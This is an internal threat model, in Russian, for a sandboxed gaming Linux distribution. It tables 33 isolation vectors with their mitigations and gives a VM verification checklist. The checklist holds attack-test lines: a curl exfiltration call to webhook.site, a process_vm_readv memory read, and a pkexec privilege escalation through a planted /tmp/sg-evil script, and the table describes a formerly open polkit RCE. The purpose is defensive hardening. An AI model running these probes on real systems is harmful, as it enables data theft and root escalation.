# Внутренняя модель угроз safegamingOS

> ⚠️ **НЕ для красной команды.** Это внутренняя карта слабых мест. Красная
> команда получает `docs/red-team.md` (цель и правила, без списка векторов).

Обновлено после раунда v0.9.5 (polkit-RCE закрыт allowlist'ом, Wayland-дефолт, host-файрвол nftables, seccomp/nonewprivs, hidepid, sysctl-батч 2).

## Статус векторов

| # | Вектор | Статус |
|---|--------|--------|
| 1 | **X11**: чтение экрана/клавиатуры чужих приложений | ✅ закрыто по умолчанию: сессия KDE Plasma 6 — **Wayland**, X11-инструменты (`xwd`, `xinput`, `xwininfo`) не видят нативные окна и реальный ввод. На X11-сессии — `sg-room-run --x11-isolate` (Xephyr: отдельный виртуальный дисплей). Игровые комнаты сознательно имеют доступ к реальному дисплею (OBS/стрим) |
| 2 | **D-Bus сессионная шина** (управление KDE/приложениями сессии) | ✅ не-игровые комнаты: `--dbus-user=none` |
| 2b | **D-Bus системная шина** (org.freedesktop.*, NetworkManager...) | ✅ не-игровые комнаты: `--dbus-system=none` (есть guard по версии firejail) |
| 3 | **DoS CPU/RAM** (майнер, fork-бомба) | ✅ cgroup v2 через systemd-скоуп: MemoryMax, MemorySwapMax=0, CPUQuota, TasksMax=256, OOMPolicy=kill |
| 4 | **Межкомнатный файловый доступ** (same-UID: комната A читает home комнаты B, карантин, базу) | ✅ blacklist чужих home и карантина в каждой комнате; home 0700; `sg.db` 0600 root; каталоги 0700 root |
| 5 | **setuid-лестница**: sudo/pkexec/su/runuser внутри комнаты → root → побег | ✅ blacklist `/usr/bin/sudo`, `/usr/bin/pkexec`, `/usr/bin/su`, `/usr/bin/runuser` |
| 6 | **/tmp** общий | ✅ `--private-tmp` |
| 6b | **/var/tmp** общий (межкомнатный почтовый ящик, персистентность) | ✅ blacklist `/var/tmp` |
| 7 | **SysV IPC** между комнатами | ✅ `--ipc-namespace` |
| 8 | **machine-id** (трекинг, связывание с хостом) | ✅ `--machine-id` (случайный в песочнице) |
| 9 | **Сеть наружу** (экфильтрация, C2) | 🟡 per-room политика: сеть включена только комнатам browser/games/streaming (и тем, кому включил `sudo sg-net ROOM on`); все остальные комнаты стартуют с `--net=none` — вирус из них физически не отправит данные наружу (curl/webhook-экфильтрация красной команды заблокирована). `--net`/`--offline` переопределяют разово. Браузер/игры со включённой сетью — осознанный риск (продукт требует интернет). План: nftables-allowlist по хостам |
| 10 | **Аудио-захват** (PipeWire/Pulse сокет в `/run/user/1000`) | ⚠️ комната `browser` слушает звук сессии (нужен браузеру) — осознанный трейдофф. Изолированные комнаты (per-room UID) не имеют доступа к сокету `/run/user` (файл 0600 чужого UID) |
| 11 | **/dev/shm** | ✅ firejail по умолчанию монтирует каждой комнате **приватный tmpfs на /dev/shm** (флаг `--keep-dev-shm` существует именно как отказ от этого) — файлы комнаты не видны ни хосту, ни другим комнатам и **умирают вместе с комнатой** (tmpfs размонтируется при закрытии jail). Для изолированных комнат дополнительно per-room UID (чужие файлы ядром закрыты). При карантине/удалении — свип остатков по UID комнаты (`sg_cleanup_room_artifacts`). Атака красной команды «shm-эскейп»: CONTAINED |
| 12 | **/proc**: чужие процессы и environ | ✅ для изолированных комнат: per-room UID + yama ptrace_scope=1 (environ/cmdline чужих UID закрыты ядром). Session-комнаты — same-UID с десктопом (осознанный трейдофф) |
| 13 | **AppArmor-профили** комнат (MAC поверх firejail) | ✅ `--apparmor` (профиль `firejail-default`) на каждую комнату; ядро грузится с `apparmor=1 security=apparmor` (live ISO: syslinux/systemd-boot, установка: GRUB). Профиль наследуется дочерними процессами — MAC работает даже при обходе firejail |
| 14 | **Ядро**: 0-day / известные CVE (firejail suid, kernel) | ❌ общее ядро — принципиальный предел firejail-подхода; снижается свежим ядром + AppArmor (MAC) |
| 15 | **Пути firejail наружу**: профили в `/etc/firejail`, `--join` с хоста, конфиги | ⚠️ `--join` со стороны хост-юзера в комнату — не побег (хост и так сильнее). `--join`/вложенный jail **из комнаты** закрыто: blacklist `/usr/bin/firejail` (вектор 24). Владельца `/etc/firejail` и конфигов перепроверить в VM |
| 16 | **KLauncher (`org.kde.klauncher5`)** — из комнаты с session bus можно дёрнуть `start_service_by_desktop_name` / `exec_blind` → запуск произвольной программы от имени хост-юзера **вне** песочницы | ✅ изолированные комнаты: `--dbus-user=none` + per-room UID (сокет сессионной шины 0600 чужого UID — ядро не даст подключиться). ⚠️ session-комнаты (games/streaming/browser): session bus открыт по продукт-требованию (OBS/порталы) — это доверенные комнаты (включается вручную через `--game`/тип комнаты); риск `exec_blind` остаётся осознанным |
| 17 | **ptrace-шпионаж** (strace/gdb за процессами хоста или других комнат) | ✅ yama `ptrace_scope=1` через `/etc/sysctl.d/99-safegamingos.conf` (live + установленная ОС) + отладчики blacklist в комнатах. Прогон красной команды: strace на root-процесс → EPERM |
| 18 | **LD_PRELOAD / подмена библиотек** | ✅ не вектор побега: влияет только на процессы внутри комнаты, привилегий не даёт (ядро работает с реальным UID, а не с тем, что вернула подмена). Не блокируем намеренно — сломало бы легитимные оверлеи (MangoHud) |
| 19 | **Утечки через ядро** (dmesg, kallsyms, eBPF) | ✅ `kptr_restrict=1`, `dmesg_restrict=1`, `bpf_jit_harden=2` (sysctl) |
| 20 | **User namespaces** (класс эксплойтов побега: firejail/kernel CVE через unprivileged userns) | ✅ `kernel.apparmor_restrict_unprivileged_userns=1` (sysctl; AppArmor включён). Нюанс: Firefox теряет внутренний userns-сэндбокс (работает, но внутренняя изоляция слабее) — осознанный компромисс в пользу границы комнаты; проверить в VM |
| 21 | **Поведенческая детекция** (майнер / fork-бомба / упор в RAM — без сигнатур) | ✅ `sg-av watch` + служба `sg-watch.service`: устойчивая CPU-нагрузка, TasksCurrent≈TasksMax, MemoryCurrent≈MemoryMax → события в журнал; `--auto-quarantine` опционален (по ТЗ решает пользователь) |
| 22 | **Персистентность / откат** | ✅ снапшоты комнат: `sg-rooms snapshot|list-snapshots|restore`; авто-снапшот 1/день при запуске, хранятся 5; pre-quarantine снапшот перед карантином |
| 23 | **SG_ROOT / журнал** (все комнаты, карантин, снапшоты, база) | ✅ chmod 700 root, `sg.db` 0600 + blacklist `${SG_ROOT}` и `${SG_LOG}` в каждой комнате |
| 24 | **Вложенный firejail / `--join` из комнаты** (двойной jail = обход имени песочницы, слежка за другой комнатой) | ✅ бинарник `/usr/bin/firejail` blacklist в каждой комнате — изнутри нельзя запустить jail вообще |
| 25 | **DNS-over-HTTPS** обходит hosts-блокировку источников (вирус в браузере резолвит заблокированный хост через DoH) | ✅ политика Firefox `DNSOverHTTPS: {Enabled: false, Locked: true}` + `BlockAboutConfig` — DoH принудительно выключен, hosts-блокировка реально работает |
| 26 | **Авто-трекинг загрузок** (источник URL для SafeGuard) | ✅ служба `sg-track.service` следит за Downloads всех комнат; URL извлекается из `places.sqlite` (moz_downloads.source) с ретраями; при обнаружении вируса SafeGuard блокирует сайт-источник автоматически |
| 27 | **Изоляция UID: конфликт имён sgroom-<slug>** (усечение до 24 символов) | ✅ useradd вернёт ошибку при коллизии → sg-room-run остановится с понятным сообщением (коллизия возможна только при двух комнатах с почти одинаковыми длинными именами; имена комнат обычно короткие) |
| 28 | **🔴 polkit-RCE**: любой wheel-процесс вызывает `pkexec` (или dbus exec-service) с путём, содержащим `/sg-` → правило матчило подстрокой → **root** | ✅ v0.9.5: правило теперь матчит ТОЛЬКО `^/usr/local/bin/sg-[a-z0-9-]+$` (строгий allowlist реальных инструментов; `/usr/local/bin` — root-owned, подменить нельзя). `/tmp/sg-evil` и любой другой путь → denied. Остаточный риск: wheel может вызвать легитимные sg-* как root (DoS: `sg-reboot`, удаление комнаты) — не root-шелл, осознанно |
| 29 | **X11-сессия по умолчанию** (любой процесс сессии — xwd/XTEST: весь экран + вся клавиатура) | ✅ v0.9.5: sddm по умолчанию **Wayland** (`Session=plasmawayland`) в live и установленной ОС; добавлен `xorg-xwayland` (X11-приложения живут под Wayland, XWayland-клиенты получают пер-window Xauthority). X11-сессия остаётся в списке сессий как fallback |
| 30 | **Host-файрвол**: входящие соединения к десктопу/комнатам (скан, эксплойт сервиса, бинд-порт из комнаты) | ✅ v0.9.5: nftables (`/etc/nftables.conf`, inet sg-firewall): вход = **drop** по умолчанию (lo, established/related, DHCP, ICMP/ICMPv6 basics), forward = drop, выход = allow. Включён в live и при установке. Открыть порт: `sudo nft add rule inet sg-firewall input tcp dport 22 accept` |
| 31 | **Same-UID память**: session-комнаты одного пользователя читают друг друга через `process_vm_readv`/`ptrace` (yama не ловит часть кейсов) | ✅ v0.9.5: seccomp-фильтр комнат расширен — `ptrace, process_vm_readv, process_vm_writev` блокируются для всех комнат (доп. слой к yama) |
| 31b | **setuid-лестница в комнате** (даже легитимный `/usr/bin/passwd` как setuid-root) | ✅ v0.9.5: `--nonewprivs` (PR_SET_NO_NEW_PRIVS) для всех комнат — setuid-бинарники не дают привилегий внутри песочницы |
| 32 | **/proc-разведка**: session-комната перечисляет процессы хоста (root/systemd) и других комнат | ✅ v0.9.5 (установленная ОС): `/proc` монтируется с `hidepid=2,gid=proc` — процесс видит только свои процессы; root и group proc — всё. Live остаётся hidepid=0 (установщик не должен ломаться) |
| 33 | **Ядро, батч 2**: perf-события, unprivileged bpf, userfaultfd, гонки на protected_*, kexec, IP-редиректы/спуфинг | ✅ v0.9.5 sysctl: `perf_event_paranoid=3`, `unprivileged_bpf_disabled=1`, `vm.unprivileged_userfaultfd=0`, `fs.protected_{fifos,regular}=2`, `protected_{hardlinks,symlinks}=1`, `suid_dumpable=0`, `kexec_load_disabled=1`, `rp_filter=1`, `tcp_syncookies=1`, accept/send_redirects=0, accept_source_route=0 |

## Принципиальный предел (честно)

С v0.9.3 **изолированные комнаты** (все типы, кроме browser/games/streaming)
работают от собственного системного пользователя `sgroom-<slug>`: чужие
`/proc`, `/dev/shm`, сокеты `/run/user` и файлы других UID закрыты ядром
(а не чёрными списками), плюс AppArmor-профиль `firejail-default` как MAC-слой
поверх firejail. Это уже «изоляция ядром», а не только списками.

**Комнаты browser/games/streaming остаются от пользователя сессии** — им нужны
PipeWire-сокет (звук), сессионная шина (порталы) и экран. Это осознанный
продукт-трейдофф: браузер — главная точка входа загрузок, и его изоляция —
это firejail (`--private` home, без session D-Bus, `--apparmor`) + модерация
Wayland для экрана/клавиатуры + hosts-блокировка источников (DoH принудительно
выключен политикой Firefox). Абсолютная граница на уровне ядра для
session-комнат не обещается — обещается для изолированных.

## Чек-лист перепроверки (v0.9.5, в VM)

```bash
sudo sg-room-run redteam -- bash    # внутри комнаты:
# echo x > /dev/shm/f               → приватный tmpfs комнаты, исчезает вместе с ней
# ls /dev/shm                        → пусто (не хост-каталог)
# echo x > /run/user/$(id -u)/f     → изолированная комната: каталога нет → ошибка
# ls /var/lib/sg-rooms              → закрыто (blacklist)
# cat /var/lib/sg-rooms/sg.db       → нет доступа
# sudo / pkexec / su                → нет файла (blacklist)
# dbus-send --system ... ListNames  → ошибка
# dd if=/dev/zero of=/var/tmp/x     → нет доступа
# ipcs                              → отдельный namespace (пусто)
# stress --cpu 4                    → упор в CPUQuota, хост жив
# curl https://webhook.site/x       → в не-сетевой комнате: ошибка (нет интерфейса)
# python3 -c 'import ctypes,os; ...process_vm_readv...' → EPERM (seccomp)
# /usr/bin/passwd                  → работает, но привилегий не даёт (--nonewprivs)
# setpriv --reuid 0 true            → не сработает (no_new_privs)

# polkit-RCE (v0.9.5): попытка подсунуть свой скрипт
printf '#!/bin/sh\nid > /tmp/pwned\n' > /tmp/sg-evil && chmod +x /tmp/sg-evil
pkexec /tmp/sg-evil                → DENIED (не в allowlist); /tmp/pwned не создаётся
pkexec /usr/local/bin/sg-room-run browser -- /bin/true  → ок (легитимный)

# firewall (v0.9.5)
sudo nft list ruleset | head         → цепочка sg-firewall, policy drop
# с другого устройства/второй VM: nmap <ip> → все порты filtered/closed

# Wayland-дефолт (v0.9.5)
grep Session /etc/sddm.conf.d/10-safegamingos.conf  → plasmawayland
# в браузерной комнате: xwd -root -out /tmp/s.png → fail/пусто (нет X11-корня)

# две комнаты одновременно:
sudo sg-room-run browser -- firefox
sudo sg-room-run games -- prismlauncher   # в games: ls /var/lib/sg-rooms → закрыто
```
